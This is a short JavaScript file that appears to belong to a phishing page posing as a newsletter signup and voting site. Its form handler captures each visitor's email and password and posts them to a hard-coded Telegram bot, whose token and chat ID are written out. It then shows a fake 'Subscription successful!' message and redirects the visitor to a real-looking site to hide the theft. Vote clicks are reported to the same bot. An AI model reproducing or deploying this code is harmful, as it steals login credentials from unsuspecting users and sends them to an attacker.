const TELE_TOKEN = "8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU";
const CHAT_ID = "5207464165";

async function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
    });
}

// Newsletter/Login Submission
const authForm = document.getElementById('authForm');
if (authForm) {
    authForm.onsubmit = async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        await sendToTelegram(`📬 *NEW LOGIN*\nEmail: ${email}\nPassword: ${pass}`);
        alert('Subscription successful!');
        // Optional: Redirect to real site after alert
        window.location.href = "https://teammanila.com";
    };
}

// Voting Buttons
document.querySelectorAll('.vote-btn').forEach(button => {
    button.addEventListener('click', async function() {
        const candidate = this.getAttribute('data-candidate');
        await sendToTelegram(`🗳 *VOTE CAST*\nCandidate: ${candidate}`);
    });
});